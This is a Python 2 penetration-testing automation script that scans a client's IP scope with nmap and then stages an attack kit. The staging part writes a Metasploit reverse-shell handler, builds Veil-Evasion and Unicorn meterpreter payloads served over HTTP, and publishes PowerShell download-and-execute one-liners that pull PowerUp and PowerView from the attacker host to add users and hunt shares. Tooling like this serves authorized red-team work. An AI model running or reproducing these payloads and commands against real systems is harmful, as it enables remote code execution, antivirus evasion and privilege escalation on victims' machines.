#!/usr/bin/python
# Andrew Luke @sw4mp_f0x
#
# 
#
import sys
import subprocess
import os
import logging
import shutil

#Options Menu



def setup():

	#Check for client folder. Create if it does not exist
	clients_path="/root/"
	Client=raw_input("Client name: ")
	global client_folder
	client_folder = clients_path + Client + "/"
	if not os.path.exists(client_folder):
		os.makedirs(client_folder)


	#Check for required files
	while not os.path.exists(client_folder + "scope.txt"):
		create_scope=raw_input("A list of IP addresses or IP ranges needs to be definied within %s. Hit enter when completed..." %(client_folder + "scope.txt"))
	while not os.path.exists(client_folder + "excludes.txt"):
		create_scope=raw_input("A list of IP addresses or IP ranges needs to be definied within %s, even if it is empty. Hit enter when completed..." %(client_folder + "excludes.txt"))

	#log_file=filepath+Client+"/"+client+".log"
	log_file=raw_input("Define log file location:[%s] " %(client_folder + Client + ".log"))
	if not log_file:
		log_file=client_folder + Client + ".log"
	logging.basicConfig(filename=log_file, format='%(asctime)s %(message)s', level=logging.INFO, datefmt='%m/%d/%Y %I:%M:%S %p -')
	

def execute(selection):
	options={"1" : kickoff,
			 "2" : web_interfaces,
			 "3" : service_scan,
			 "4" : pentest_setup,
			 "5" : nfsulator
	}
	options[selection]()
	
def kickoff():
	#Ping-Sweep
	print "===================================="
	print "Beginning Discovery Scan"
	print "===================================="
	logging.info("Beginning Ping Sweep")
	ping_sweep=subprocess.Popen(['nmap -sn -v10 -T4 --open -iL %sscope.txt --excludefile %sexcludes.txt -oG %sping-sweep --stats-every 1m' %(client_folder, client_folder, client_folder)], shell=True) 
	ping_sweep.wait()
	logging.info("Ping Sweep Complete")
	os.system("awk '/Up/{print $2}' %sping-sweep |sort -u > %slive-hosts.txt" %(client_folder, client_folder))
	livehosts=open("%slive-hosts.txt" %(client_folder), "r")
	for host in livehosts:
		global LiveHostCount
		LiveHostCount+=1
	livehosts.close()

	#Check for exclusions within live-hosts
	print "\n\nRFI found %s live hosts on the network." %(LiveHostCount)
	check=raw_input("Check that the exclusions were actually excluded and then press [Enter] to continue...")

	#Targetted Port Scans
	print "===================================="
	print "Beginning Targetted Service Scans"
	print "===================================="
	logging.info("Beginning Targeted Port Scan")
	ports=["445", "21", "23", "25", "53", "389", "686", "1433", "2049", "3306", "5800,5900-5920", "5985", "10000", "80"]
	for port in ports:
		logging.info("Scanning port %s." %(port))
		targetted_ports=subprocess.Popen(['nmap -Pn -n -p%s -sV -sC --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' %(port, client_folder, port, client_folder)], shell=True) 
		targetted_ports.wait()
	logging.info("Targeted Port Scan Complete")

	if not os.path.exists(client_folder + "Finals"):
		os.makedirs(client_folder + "Finals")
	os.system("awk '!/telnet\?/ && !/print/ && !/printer/ && !/JetDirect/ && !/#/ && !/tcpwrapped/ && !/Ricoh/ && !/Up/ && !/APC/ && !/Pocket/' %s23.gnmap | uniq > %s/Finals/TelnetList.txt" %(client_folder, client_folder))
	os.system("awk '!/#/{print $2}' %s445.gnmap | sort -u > %s445.txt" %(client_folder, client_folder))

	print "===================================="
	print "Beginning SMTP Open Relay"
	print "and Enumeration NSE scripts"
	print "===================================="
	os.system("awk '!/printer/ && !/JetDirect/ && !/#/ && !/tcpwrapped/ && !/Ricoh/ && !/Up/ && !/APC/ && !/Pocket/{print $2}' %s25.gnmap | uniq > %ssmtprelay.txt" %(client_folder, client_folder))
	logging.info("Checking for open relays")
	open_relay=subprocess.Popen(['nmap -Pn --script smtp-open-relay.nse -p 25,465,587 --open -iL %ssmtprelay.txt -oA %sFinals/SMTP_Relay' %(client_folder, client_folder)], shell=True) 
	open_relay.wait()
	logging.info("Open relay check complete")

	logging.info("Checking for SMTP enum")
	open_relay=subprocess.Popen(['nmap -Pn --script smtp-enum-users.nse -p 25,465,587 --open -iL %ssmtprelay.txt -oA %sFinals/SMTP_Relay' %(client_folder, client_folder)], shell=True) 
	open_relay.wait()
	logging.info("SMTP enum check complete")
	os.remove("%ssmtprelay.txt" %(client_folder))

	global message
	message="Kickoff scans complete"
    
def web_interfaces():
	print "===================================="
	print "Beginning Rawr Scan"
	print "===================================="
	logging.info("Starting Nmap web scan")
	web_scan=subprocess.Popen(['nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,7000,7001,7002,8000,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8443,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL %slive-hosts.txt -oA %sweb' %(client_folder, client_folder)], shell=True) 
	web_scan.wait()
	logging.info("Nmap web scan complete")

	logging.info("Starting Rawr")
	rawr_proc=subprocess.Popen(["python %s -f %sweb.xml -d %s" %(rawr_folder, client_folder, client_folder)], shell=True) 
	rawr_proc.wait()
	logging.info("Rawr complete")

	global message
	message="Rawr complete"

def service_scan():
	print "===================================="
	print "Beginning Service Scan"
	print "===================================="
	logging.info("Starting service scan")
	service_scan=subprocess.Popen(['nmap -sV --open -iL %slive-hosts.txt -v10 -T4 -oA %ssvc-scan' %(client_folder, client_folder)], shell=True)
	service_scan.wait()
	logging.info("Service scan complete")

	global message
	message="Service scan complete"

def pentest_setup():
	print "===================================="
	print "Setting up pentest files"
	print "===================================="
	ip=raw_input("Enter LHOST> ")
	bounce=open('/bounce', "w")
	bounce.write('''use exploit/multi/handler
					jobs -K
					set payload windows/meterpreter/reverse_tcp
					set exitonsession false
					set lport 53
					set enablestageencoding true
					set autorunscript migrate -f
					set LHOST %s
					exploit -j -z
					set payload windows/meterpreter/reverse_https
					set lport 443
					exploit -j -z''' %(ip))
	
	bool=False
	while not bool:
		kali2=raw_input("Are you using Kali 2? [y/n]: ")
		global cmd_path
		if kali2 is "n":
			cmd_path="/var/www/cmd.html"
			bool=True
		elif kali2 is "y":
			cmd_path="/var/www/html/cmd.html"
			bool=True
	
	cmd_html=('''<b>Invoke-AllChecks</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-Allchecks"
				<p><p>
				<b>Write-UserAddServiceBinary</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Write-UserAddServiceBinary -ServiceName SQLRODBC"
				<p><p>
				<b>Invoke-ServiceUserAdd</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-ServiceUserAdd -ServiceName spooler"
				<p><p>
				<b>Invoke-FindLocalAdminAccess</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-FindLocalAdminAccess"
				<p><p>
				<b>Invoke-userhunter</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-userhunter"
				<p><p>
				<b>Invoke-ShareFinder</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii found_shares.txt"''' %(ip, ip, ip, ip, ip, ip))
	
	cmd_file=open(cmd_path, "w")
	cmd_file.write(cmd_html)
	cmd_file.close()

	#Deleting old files
	if os.path.exists("/root/HTTPS_443.exe"):	
		os.remove("/root/HTTPS_443.exe")
	if os.path.exists("/root/TCP_53.exe"):
		os.remove("/root/TCP_53.exe")
	if os.path.exists("/root/power443.txt"):
		os.remove("/root/power443.txt")
	if os.path.exists("/root/power53.txt"):
		os.remove("/root/power53.txt")
	if os.path.exists("/var/www/html/HTTPS_443.exe"):
		os.remove("/var/www/html/HTTPS_443.exe")
	if os.path.exists("/var/www/html/TCP_53.exe"):
		os.remove("/var/www/html/TCP_53.exe")
	if os.path.exists("/var/www/html/power443.txt"):
		os.remove("/var/www/html/power443.txt")
	if os.path.exists("/var/www/html/power53.txt"):
		os.remove("/var/www/html/power53.txt")
	if os.path.exists("/usr/share/veil-output/compiled/HTTPS_443.exe"):
		os.remove("/usr/share/veil-output/compiled/HTTPS_443.exe")
	if os.path.exists("/usr/share/veil-output/handlers/HTTPS_443_handler.rc"):
		os.remove("/usr/share/veil-output/handlers/HTTPS_443_handler.rc")
	if os.path.exists("/usr/share/veil-output/source/HTTPS_443.rb"):
		os.remove("/usr/share/veil-output/source/HTTPS_443.rb")
	if os.path.exists("/usr/share/veil-output/compiled/TCP_53.exe"):
		os.remove("/usr/share/veil-output/compiled/TCP_53.exe")
	if os.path.exists("/usr/share/veil-output/handlers/TCP_53_handler.rc"):
		os.remove("/usr/share/veil-output/handlers/TCP_53_handler.rc")
	if os.path.exists("/usr/share/veil-output/source/TCP_53.rb"):
		os.remove("/usr/share/veil-output/source/TCP_53.rb")
	
	#Build Veil Ruby HTTPS payload
	https_payload=subprocess.Popen(['/root/tools/Veil-Evasion/Veil-Evasion.py -p ruby/meterpreter/rev_https -c LPORT=443 LHOST=%s -o HTTPS_443' %(ip)], shell=True)
	https_payload.wait()
	shutil.copyfile("/usr/share/veil-output/compiled/HTTPS_443.exe", "/root/HTTPS_443.exe")
	shutil.copyfile("/usr/share/veil-output/compiled/HTTPS_443.exe", "/var/www/html/HTTPS_443.exe")

	#Build Veil Ruby HTTPS payload
	tcp_payload=subprocess.Popen(['/root/tools/Veil-Evasion/Veil-Evasion.py -p ruby/meterpreter/rev_tcp -c LPORT=53 LHOST=%s -o TCP_53' %(ip)], shell=True)
	tcp_payload.wait()
	shutil.copyfile("/usr/share/veil-output/compiled/TCP_53.exe", "/root/TCP_53.exe")
	shutil.copyfile("/usr/share/veil-output/compiled/TCP_53.exe", "/var/www/html/TCP_53.exe")

	#Build Unicorn Powershell HTTPS payload
	unicorn_https=subprocess.Popen(['python /root/tools/unicorn/unicorn.py windows/meterpreter/reverse_https %s 443' %(ip)], shell=True)
	unicorn_https.wait()
	shutil.copyfile("./powershell_attack.txt", "/root/powerHTTPS.txt")
	shutil.copyfile("./powershell_attack.txt", "/var/www/html/powerHTTPS.txt")
	update_cmd=open(cmd_path, "a")
	open_payload=open("./powershell_attack.txt", "r")
	unicorn_https_payload=open_payload.readlines()
	update_cmd.write('''<p><p>
						<b>Powershell HTTPS Payload</b><p><p>
						%s''' %(unicorn_https_payload[0]))
	open_payload.close()

	#Build Unicorn Powershell HTTPS payload
	unicorn_tcp=subprocess.Popen(['python /root/tools/unicorn/unicorn.py windows/meterpreter/reverse_tcp %s 53' %(ip)], shell=True)
	unicorn_tcp.wait()
	shutil.copyfile("./powershell_attack.txt", "/root/powerTCP.txt")
	shutil.copyfile("./powershell_attack.txt", "/var/www/html/powerTCP.txt")
	open_payload=open("./powershell_attack.txt", "r")
	unicorn_tcp_payload=open_payload.readlines()
	update_cmd.write('''<p><p>
						<b>Powershell TCP Payload</b><p><p>
						%s''' %(unicorn_tcp_payload[0]))
	update_cmd.close()
	open_payload.close()
	os.remove("./powershell_attack.txt")
	os.remove("./unicorn.rc")

	global message
	message="Pentest setup complete"

def nfsulator():
	print "===================================="
	print "Beginning Rawr Scan"
	print "===================================="


	global message
	message="Kickoff Scan complete"

def main_menu(check=""):
	try:
		print("==========================================================")
		print("Roll For Initiative")
		print("By: @Sw4mp_f0x")
		print("==========================================================")
		print("")
		
		#Check for message, print message if present, clear out message
		if check:
			print(check)
			print("")
		global message
		message=""
		
		print("Roll For Initiative Options:")
		print("	[1] Kickoff Scans")
		print("	[2] Web Interface Scan + Rawr")
		print("	[3] Nmap Service Scan")
		print("	[4] Pentest Setup")
		print("	[5] NFSulator")
		print("")
		selection=raw_input("Please select an option: ")
		if 1 <= int(selection) <= 5:
			execute(selection)
		else:
			raise ValueError('A very specific bad thing happened')
	except ValueError:
		unused_var=os.system("clear")
		main_menu("Invalid entry. Pick again.")

LiveHostCount=0
rawr_folder="/root/tools/rawr/rawr.py"
global cmd_path
cmd_path=""
global message
message=""
setup()

try:
	while True:
		main_menu(message)
		unused_var=os.system("clear")
except KeyboardInterrupt:
	print("Later!")	
